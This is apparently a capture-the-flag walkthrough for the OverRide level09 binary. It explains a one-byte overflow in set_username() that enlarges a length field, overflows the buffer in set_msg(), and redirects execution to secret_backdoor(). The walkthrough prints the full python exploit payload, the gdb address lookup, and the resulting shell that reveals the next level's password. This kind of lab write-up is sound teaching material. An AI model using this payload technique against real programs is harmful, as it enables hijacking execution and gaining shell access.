
# Walkthrough

**Main** : 
The Level09 challenge involves exploiting a binary that takes user input for a username and a message. The goal is to execute the `secret_backdoor()`  this function  uses fgets to read input from the user, and it calls the system function to execute the provided command.

The function `secret_backdoor()`  is not part of the normal program execution flow, so the objective is to redirect the program to execute this function.

Two functions, `set_username()` and `set_msg(),` are responsible for processing the input strings and storing them in the s_message structure.

`set_msg`() uses `strncpy()` with the s_message->len as the size parameter.
set_username() uses a loop to copy characters one by one from the local buffer to s_message->username.

The `set_username()` function copies the characters in a loop that repeats 41 times, indicating that a 1-byte overflow is possible. This allows us to overwrite the first byte of s_message->len.

**Vunerability:**
The `set_username()` function copies the characters in a loop that repeats 41 times, indicating that a 1-byte overflow is possible. This allows us to overwrite the first byte of s_message->len to make overflow while  `set_msg()` uses `strncpy()` with the s_message->len

**Solution idea:**

In the context of this challenge, by modifying the length of the message using the `'\xff'` byte, We can manipulate the program's execution flow and potentially redirect it to execute `secret_backdoor()` function, which they weren't supposed to be able to access.
 This demonstrates how a simple buffer overflow and manipulation of data can lead to a security vulnerability.

To exploit the program, the address of the `secret_backdoor()` function needs to be obtained.
The solution constructs a payload that consists of 40  characters, followed by a single byte ('0xff') to overwrite the first byte of s_message->len.
Then, it appends additional  characters to reach the EIP save location and replaces it with the desired address of   `secret_backdoor()`  and finally, it appends '/bin/sh' to the payload.


**Process to exploit :**
>   1. ****Exploiting s_message->len:** **
>   2. **Buffer overflow Offset**
>   2. **Ruuning  Payload**



## Step 1
### Exploiting s_message->len

By manipulating the username input in the set_username function, it's possible to overflow the s_message->len field. The overflow of a single byte allows altering the size parameter for strncpy in set_msg.
The goal is to set s_message->len to a larger value (up to 255) to enable the buffer overflow in set_msg.

**Structure**
	the len_message variable follows the username variable. 
	The layout in memory for your s_message structure is as follows:

	message (140 bytes)
	username (40 bytes)
	len_message (4 bytes for an integer)
So, after the username data in memory, the next address will be the address for the len_message variable.

**First  step of construct payload:**
- 40 characters '\x90' : To fill the username buffer and reach the s_message->len field.
- '\xff': To overflow the s_message->len field with a large value (255).
-	`python -c 'print 40 * "\x90" + "\xff"`


## Step 2
### Buffer overflow Offset

After testing and observing with pattern buffer overflow pattern we see that we have an offset of 200 it perfect, it was just what we wanted.

```
level09@OverRide:~$ python -c 'print "\x90" * 40 + "\xff" + "\n" + "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n"' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

**Step  2  of construct payload:**
- 200 '\x90' characters: To reach the return address.



## Step 2
###  Ruuning payload Buffer overflow Offset

**Identifying Vulnerable Function**
There's a `secret_backdoor` function that uses fgets to read input from the user, and it calls the system function to execute the provided command.

- Run the program with the constructed payload to trigger the buffer overflow.
- The return address is overwritten with the address of `secret_backdoor`,
```
(gdb) print secret_backdoor
$4 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

 We have to convert the address of secret_backdoor to little endian. `0x55555555488c = \x8c\x48\x55\x55\x55\x55\x00\x00`

**Load Payload:** 
```
level09@OverRide:~$ (python -c 'print "\x90" * 40 + "\xff" + "\n" + "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
cat /cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
